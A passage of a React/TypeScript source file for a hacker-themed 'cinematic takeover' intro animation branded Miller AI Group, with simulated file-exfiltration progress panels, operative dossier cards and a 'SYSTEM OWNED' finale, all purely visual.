              totalSize: prev.totalSize + (parseFloat(node.size?.replace(/[^0-9.]/g, '') || '0') * (node.size?.includes('GB') ? 1024 : node.size?.includes('MB') ? 1 : 0.001))
            }))

            if (isSensitive) {
              setAlerts(prev => [...prev.slice(-2), {
                id: Math.random().toString(),
                type: 'breach',
                title: 'DATA EXFILTRATED',
                message: `${node.name} captured (${node.size})`
              }])
            }
          } else {
            setFileTree(prev => updateNodeStatus(prev, node.path, 'exfiltrated'))
          }

          currentIndex++
          setTimeout(processFile, node.type === 'folder' ? 100 : (isSensitive ? 400 : 200))
        }, 200)
      }, 250)
    }

    // Start after a brief delay
    const startTimer = setTimeout(processFile, 500)

    return () => clearTimeout(startTimer)
  }, [initialFileTree, flattenTree, updateNodeStatus, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <PerspectiveGrid color="#00ffff" speed={0.3} density={25} className="opacity-20" />

      <div className="absolute inset-0 flex">
        {/* Left panel - File Tree */}
        <div className="w-2/3 h-full p-6 flex flex-col">
          {/* Header */}
          <div className="mb-4">
            <div className="flex items-center gap-3 mb-2">
              <motion.div
                className="w-3 h-3 bg-red-500 rounded-full"
                animate={{ opacity: [1, 0.3, 1] }}
                transition={{ duration: 0.5, repeat: Infinity }}
              />
              <h2 className="text-2xl font-mono font-bold text-fuchsia-500">
                FILE SYSTEM INTRUSION
              </h2>
            </div>
            <motion.p
              className="text-cyan-400 font-mono text-sm h-5"
              key={currentAction}
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
            >
              {currentAction}
            </motion.p>
          </div>

          {/* File tree container */}
          <div className="flex-1 bg-black/80 border border-cyan-500/30 rounded-lg overflow-hidden">
            <div className="bg-neutral-900/80 px-4 py-2 border-b border-cyan-500/20 flex items-center gap-2">
              <div className="flex gap-1.5">
                <div className="w-3 h-3 rounded-full bg-red-500" />
                <div className="w-3 h-3 rounded-full bg-yellow-500" />
                <div className="w-3 h-3 rounded-full bg-green-500" />
              </div>
              <span className="text-xs font-mono text-neutral-400 ml-2">root@target:/</span>
            </div>
            <div className="p-2 h-[calc(100%-40px)] overflow-y-auto">
              {fileTree.map((node, i) => (
                <FileTreeNode key={node.path} node={node} />
              ))}
            </div>
          </div>
        </div>

        {/* Right panel - Stats and Alerts */}
        <div className="w-1/3 h-full p-6 flex flex-col gap-4">
          {/* Stats panel */}
          <div className="bg-black/80 border border-fuchsia-500/30 rounded-lg p-4">
            <h3 className="text-sm font-mono text-fuchsia-500 mb-4 tracking-wider">EXFILTRATION STATUS</h3>

            <div className="space-y-3">
              <div>
                <div className="flex justify-between text-xs font-mono mb-1">
                  <span className="text-neutral-400">FILES SCANNED</span>
                  <span className="text-cyan-400">{stats.scanned}</span>
                </div>
                <GlitchProgressBar progress={stats.scanned * 3} color="#00ffff" height={4} showPercentage={false} />
              </div>

              <div>
                <div className="flex justify-between text-xs font-mono mb-1">
                  <span className="text-neutral-400">FILES ACCESSED</span>
                  <span className="text-yellow-400">{stats.accessed}</span>
                </div>
                <GlitchProgressBar progress={stats.accessed * 3} color="#ffd700" height={4} showPercentage={false} />
              </div>

              <div>
                <div className="flex justify-between text-xs font-mono mb-1">
                  <span className="text-neutral-400">EXFILTRATED</span>
                  <span className="text-green-400">{stats.exfiltrated}</span>
                </div>
                <GlitchProgressBar progress={stats.exfiltrated * 5} color="#00ff41" height={4} showPercentage={false} />
              </div>

              <div className="pt-2 border-t border-neutral-800">
                <div className="flex justify-between text-sm font-mono">
                  <span className="text-neutral-400">TOTAL DATA</span>
                  <span className="text-fuchsia-400">{stats.totalSize.toFixed(1)} MB</span>
                </div>
              </div>
            </div>
          </div>

          {/* Upload indicator */}
          <div className="bg-black/80 border border-green-500/30 rounded-lg p-4">
            <div className="flex items-center gap-2 mb-3">
              <motion.div
                className="w-2 h-2 bg-green-500 rounded-full"
                animate={{ opacity: [1, 0.3, 1] }}
                transition={{ duration: 0.3, repeat: Infinity }}
              />
              <span className="text-xs font-mono text-green-400">C2 UPLOAD ACTIVE</span>
            </div>
            <div className="font-mono text-xs text-neutral-500">
              <p>ENDPOINT: c2.miller-ai.group</p>
              <p>PROTOCOL: TLS 1.3 / ENCRYPTED</p>
              <p>STATUS: <span className="text-green-400">CONNECTED</span></p>
            </div>
          </div>

          {/* Alerts */}
          <div className="flex-1 space-y-2 overflow-y-auto">
            <h3 className="text-xs font-mono text-neutral-500 tracking-wider">ACTIVITY LOG</h3>
            <AnimatePresence>
              {alerts.map(alert => (
                <AlertBox
                  key={alert.id}
                  type={alert.type as any}
                  title={alert.title}
                  message={alert.message}
                  autoDismiss={5000}
                  onDismiss={() => setAlerts(prev => prev.filter(a => a.id !== alert.id))}
                />
              ))}
            </AnimatePresence>
          </div>
        </div>
      </div>

      <HUDBrackets color="#00ffff" />
      <ScanLineOverlay speed={4} color="#00ffff" />
    </motion.div>
  )
}

// ============================================
// SCENE 6: CHARACTER BRIEFING - GTA/COD STYLE
// Using the enhanced CharacterDossierCard
// ============================================
function CharacterBriefingScene({ onComplete }: { onComplete: () => void }) {
  const [currentIndex, setCurrentIndex] = useState(0)
  const operative = OPERATIVES[currentIndex]

  const handleOperativeComplete = useCallback(() => {
    if (currentIndex < OPERATIVES.length - 1) {
      setCurrentIndex(prev => prev + 1)
    } else {
      setTimeout(onComplete, 500)
    }
  }, [currentIndex, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      {/* Background effects */}
      <PerspectiveGrid color={operative.primaryColor} speed={0.5} density={15} className="opacity-30" />

      {/* Diagonal accent stripes */}
      <div
        className="absolute inset-0 opacity-10"
        style={{
          backgroundImage: `repeating-linear-gradient(
            45deg,
            ${operative.primaryColor} 0px,
            ${operative.primaryColor} 3px,
            transparent 3px,
            transparent 25px
          )`
        }}
      />

      {/* Color wash from character */}
      <motion.div
        key={operative.id}
        className="absolute inset-0"
        style={{
          background: `radial-gradient(ellipse at 25% 50%, ${operative.primaryColor}30 0%, transparent 60%)`
        }}
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.5 }}
      />

      {/* Character dossier - using the enhanced component */}
      <AnimatePresence mode="wait">
        <motion.div
          key={operative.id}
          className="absolute inset-0 flex items-center justify-center"
          initial={{ opacity: 0, x: 100 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -100 }}
          transition={{ duration: 0.3 }}
        >
          <CharacterDossierCard
            character={operative}
            isActive={true}
            onComplete={handleOperativeComplete}
          />
        </motion.div>
      </AnimatePresence>

      {/* Progress indicator */}
      <div className="absolute bottom-8 left-1/2 -translate-x-1/2 flex gap-3">
        {OPERATIVES.map((_, i) => (
          <motion.div
            key={i}
            className="w-16 h-1 rounded-full"
            style={{
              background: i <= currentIndex ? operative.primaryColor : 'rgba(255,255,255,0.2)'
            }}
            animate={i === currentIndex ? { opacity: [0.5, 1, 0.5] } : {}}
            transition={{ duration: 1, repeat: Infinity }}
          />
        ))}
      </div>

      {/* Corner brackets */}
      <HUDBrackets color={operative.primaryColor} size={50} />

      {/* Bottom info bar */}
      <div className="absolute bottom-4 left-8 right-8 flex justify-between font-mono text-xs">
        <span style={{ color: operative.primaryColor }}>
          MILLER AI GROUP // OPERATIVE DOSSIER {currentIndex + 1}/{OPERATIVES.length}
        </span>
        <span className="text-neutral-500">CLEARANCE: OMEGA BLACK</span>
      </div>

      <ScanLineOverlay speed={5} color={operative.primaryColor} />
    </motion.div>
  )
}

// ============================================
// SCENE 7: SYSTEM OWNED - Dramatic Final Reveal
// ============================================
function SystemOwnedScene({ onComplete, userName }: { onComplete: () => void; userName: string }) {
  const [stage, setStage] = useState(0)

  useEffect(() => {
    const timers = [
      setTimeout(() => setStage(1), 500),
      setTimeout(() => setStage(2), 1500),
      setTimeout(() => setStage(3), 2500),
      setTimeout(() => setStage(4), 3500),
      setTimeout(() => setStage(5), 4500),
      setTimeout(onComplete, 7000)
    ]
    return () => timers.forEach(clearTimeout)
  }, [onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black flex items-center justify-center overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <DataStreamRain color="#ff00ff" density={2} speed={1.5} className="opacity-50" />

      <GlitchCanvas intensity={2} layers={['rgb-split', 'noise', 'scanlines', 'vhs', 'corruption']}>
        <ScreenShake active={stage >= 1 && stage < 4} intensity={1}>
          <motion.div className="relative z-10 text-center px-8">
            {/* ASCII Logo */}
            <AnimatePresence>
              {stage >= 1 && (
                <motion.pre
                  className="text-fuchsia-500 text-xs md:text-sm font-mono mb-8 leading-tight whitespace-pre"
                  style={{ textShadow: '0 0 30px rgba(255,0,255,0.8)' }}
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ duration: 0.5 }}
                >
{`
 ███╗   ███╗██╗██╗     ██╗     ███████╗██████╗      █████╗ ██╗
 ████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗    ██╔══██╗██║
 ██╔████╔██║██║██║     ██║     █████╗  ██████╔╝    ███████║██║
 ██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗    ██╔══██║██║
 ██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║    ██║  ██║██║
 ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝
           ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗
          ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗
          ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝
          ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝
          ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║
           ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝
`}
                </motion.pre>
              )}
            </AnimatePresence>

            {/* SYSTEM OWNED */}
            <AnimatePresence>
              {stage >= 2 && (
                <motion.h1
                  className="text-5xl md:text-8xl font-bold font-mono mb-6"
                  style={{
                    color: '#ff0040',
                    textShadow: '0 0 60px rgba(255,0,64,0.8), 6px 0 0 #00ffff, -6px 0 0 #ff00ff'
                  }}
                  initial={{ opacity: 0, scale: 0.5, y: 50 }}
                  animate={{ opacity: 1, scale: 1, y: 0 }}
                  transition={{ type: 'spring', duration: 0.6 }}
                >
                  <ChromaticText intensity={3}>SYSTEM OWNED</ChromaticText>
                </motion.h1>
              )}
            </AnimatePresence>

            {/* Welcome message */}
            <AnimatePresence>
              {stage >= 3 && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5 }}
                >
                  <p className="text-2xl md:text-3xl font-mono text-fuchsia-400 mb-3">
                    Welcome to the collective, {userName}
                  </p>
                  <p className="text-sm md:text-base font-mono text-neutral-500">
                    Your system now belongs to Miller AI Group
                  </p>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Operative indicators */}
            <AnimatePresence>
              {stage >= 4 && (
                <motion.div
                  className="mt-10 flex justify-center items-center gap-6"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                >
                  {OPERATIVES.map((op, i) => (
                    <motion.div
                      key={op.id}
                      className="flex flex-col items-center gap-2"
                      initial={{ scale: 0, y: 20 }}
                      animate={{ scale: 1, y: 0 }}
                      transition={{ delay: i * 0.15 }}
                    >
                      <motion.div
                        className="w-4 h-4 rounded-full"
                        style={{
                          background: op.primaryColor,
                          boxShadow: `0 0 20px ${op.primaryColor}`
                        }}
                        animate={{ opacity: [0.5, 1, 0.5] }}
                        transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.2 }}
                      />
                      <span
                        className="text-xs font-mono"
                        style={{ color: op.primaryColor }}
                      >
                        {op.codename.split(' ')[0]}
                      </span>
                    </motion.div>
                  ))}
                </motion.div>
              )}
            </AnimatePresence>

            {/* Final stats */}
            <AnimatePresence>
              {stage >= 5 && (
                <motion.div
                  className="mt-8 grid grid-cols-3 gap-8 max-w-xl mx-auto"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                >
                  <div className="text-center">
                    <p className="text-3xl font-mono font-bold text-cyan-400">15</p>
                    <p className="text-xs font-mono text-neutral-500">NODES PWNED</p>
                  </div>
                  <div className="text-center">
                    <p className="text-3xl font-mono font-bold text-green-400">3.4GB</p>
                    <p className="text-xs font-mono text-neutral-500">DATA EXFIL</p>
                  </div>
                  <div className="text-center">
                    <p className="text-3xl font-mono font-bold text-fuchsia-400">5</p>
                    <p className="text-xs font-mono text-neutral-500">OPERATIVES</p>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        </ScreenShake>
      </GlitchCanvas>

      <HUDBrackets color="#ff00ff" />
      <ScanLineOverlay speed={2} color="#ff00ff" />
    </motion.div>
  )
}

// ============================================
// MAIN CINEMATIC TAKEOVER
// ============================================
export function CinematicTakeover({ onComplete, userName = 'Operator' }: CinematicTakeoverProps) {
  const [scene, setScene] = useState<SceneType>('boot')
  const [audioStarted, setAudioStarted] = useState(false)
  const cleanupAudioRef = useRef<(() => void) | null>(null)

  // Try to get audio engine if available
  const audioEngine = useMemo(() => {
    try {
      // Dynamic import of audio context - will be null if not wrapped in provider
      return null // Audio will be handled by parent component
    } catch {
      return null
    }
  }, [])

  const handleSceneComplete = useCallback((nextScene: SceneType) => {
    setScene(nextScene)
  }, [])

  // Start audio on first user interaction (for browsers that require it)
  const handleInteraction = useCallback(() => {
    if (!audioStarted) {
      setAudioStarted(true)
      // Parent component should handle audio via AudioEngineProvider
    }
  }, [audioStarted])

  useEffect(() => {
    if (scene === 'complete') {
      // Cleanup audio
      if (cleanupAudioRef.current) {
        cleanupAudioRef.current()
      }
      onComplete()
    }
  }, [scene, onComplete])

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (cleanupAudioRef.current) {
        cleanupAudioRef.current()
      }
    }
  }, [])

  return (
    <div
      className="fixed inset-0 bg-black z-50"
      onClick={handleInteraction}
      onKeyDown={handleInteraction}
      tabIndex={0}
      role="application"
      aria-label="Cinematic system takeover experience"
    >
      {/* Audio hint - shown briefly */}
      {!audioStarted && scene === 'boot' && (
        <div className="absolute bottom-8 left-1/2 -translate-x-1/2 z-50 text-cyan-400/60 text-xs font-mono animate-pulse">
          Click anywhere for audio
        </div>
      )}

      <AnimatePresence mode="wait">
        {scene === 'boot' && (
          <BootSequence
            key="boot"
            onComplete={() => handleSceneComplete('interference')}
          />
        )}

        {scene === 'interference' && (
          <InterferenceScene
            key="interference"
            onComplete={() => handleSceneComplete('network-breach')}
          />
        )}

        {scene === 'network-breach' && (
          <NetworkBreachScene
            key="network"
            onComplete={() => handleSceneComplete('terminal-takeover')}
          />
        )}

        {scene === 'terminal-takeover' && (
          <TerminalTakeoverScene
            key="terminal"
            onComplete={() => handleSceneComplete('file-intrusion')}
          />
        )}

        {scene === 'file-intrusion' && (
          <FileIntrusionScene
            key="files"
            onComplete={() => handleSceneComplete('character-briefing')}
          />
        )}

        {scene === 'character-briefing' && (
          <CharacterBriefingScene
            key="characters"
            onComplete={() => handleSceneComplete('system-owned')}
          />
        )}

        {scene === 'system-owned' && (
          <SystemOwnedScene
            key="owned"
            userName={userName}
            onComplete={() => handleSceneComplete('complete')}
          />
        )}
      </AnimatePresence>
    </div>
  )
}

export type { CinematicTakeoverProps }
